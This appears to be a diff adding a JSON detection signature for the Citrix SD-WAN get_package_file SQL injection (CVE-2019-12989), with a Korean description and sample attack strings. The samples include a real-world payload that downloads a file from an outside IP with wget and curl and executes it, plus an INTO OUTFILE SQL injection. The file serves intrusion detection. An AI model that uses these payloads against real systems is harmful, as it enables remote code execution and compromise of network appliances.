@@ -1,0 +1,14 @@
+{
+        "Name": "Citrix SD-WAN get_package_file SQL Injection",
+        "Description": "\r - SD-WAN은 엔터프라이즈 네트워크 연결 및 서킷 비용 관리를 위한 자동화된 프로그램적 접근 방식\r\n - get_package_file 요청 시 str_name 매개변수에 대한 적절한 검증이 존재하지 않아 발생/r\n - 공격 성공 시, 피해 서>버에 인증 우회 가능/r\n - 벤사에서 제공하는 최신버전으로 업데이트",
+        "References": ["CVE-2019-12989","https://www.tenable.com/security/research/tra-2019-32"],
+        "Samples":	[
+			"POST /sdwan/nitro/v1/config/get_package_file?action=file_download/cgi-bin/installpatch.cgi?swc-token=%d&installfile=`%s`' % 99999; wget http://80.82.67.209/richard; curl -O http://80.82.67.209/richard; chmod +x richard; sh richard HTTP/1.0",
+			"SSL_CLIENT_VERIFY : 'SUCCESS'",
+			"get_package_fil:",
+			"site_name: 'blah' union select 'tenable','zero','day','research' INTO OUTFILE '/tmp/token_0';#,appliance_type: primary,package_type: active"
+			],
+        "Keywords": [["SSL_CLIENT_VERIFY: SUCCESS","?action=file_download"],["application/json"],["site_name "]],
+        "Signature": []
+}
+
